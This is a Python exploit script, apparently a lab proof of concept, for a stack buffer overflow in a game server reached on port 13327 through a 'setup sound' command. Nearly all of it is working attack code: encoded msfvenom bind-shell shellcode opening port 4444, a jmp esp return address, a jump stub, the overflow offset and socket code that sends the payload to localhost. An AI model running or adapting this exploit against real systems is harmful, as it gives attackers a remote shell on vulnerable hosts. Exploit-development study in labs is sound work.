#!/usr/bin/python
# coding: utf-8
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#nasm > add eax,12
#00000000  83C00C            add eax,byte +0xc
#nasm > jmp eax
#00000000  FFE0              jmp eax
#\x83\xc0\x0c\xff\xe0"

#jmp esp 08134596
#\x96\x45\x13\x08"

#msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b \x00\x0a\x0d\x20" â€“e x86/shikata_ga_nai
#Payload size: 105 bytes
shellcode = (
"\xda\xd9\xd9\x74\x24\xf4\xbb\xbc\xf1\x07\x97\x5f\x31\xc9\xb1"
"\x14\x31\x5f\x19\x03\x5f\x19\x83\xc7\x04\x5e\x04\x36\x4c\x69"
"\x04\x6a\x31\xc6\xa1\x8f\x3c\x09\x85\xf6\xf3\x49\xbd\xa8\x59"
"\x21\x40\x55\x4f\xed\x2e\x45\x3e\x5d\x26\x84\xaa\x3b\x60\x8a"
"\xab\x4a\xd1\x10\x1f\x48\x62\x7e\x92\xd0\xc1\xcf\x4a\x1d\x45"
"\xbc\xca\xf7\x79\x9b\x21\x87\xcf\x62\x42\xef\xe0\xbb\xc1\x87"
"\x96\xec\x47\x3e\x09\x7a\x64\x90\x86\xf5\x8a\xa0\x22\xcb\xcd")

host = "127.0.0.1"
crash = 4379
offset = 4368

overflow = shellcode + "A"*(offset-105)  + "\x96\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0" + "\x90\x90"

buffer = "\x11(setup sound " + overflow + "\x90\x00#"
s.connect((host,13327))
s.send(buffer)
data = s.recv(1024)
print data
print "[*]Payload Sent !"
